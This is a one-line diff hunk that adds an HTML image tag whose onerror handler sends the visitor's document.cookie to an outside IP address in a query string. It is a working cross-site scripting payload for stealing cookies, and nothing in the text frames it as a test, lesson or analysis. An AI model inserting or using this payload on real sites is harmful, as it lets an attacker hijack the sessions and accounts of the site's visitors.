@@ -1,0 +1,1 @@
+<img src=x onerror=this.src='http://10.9.8.166/?c='+document.cookie>
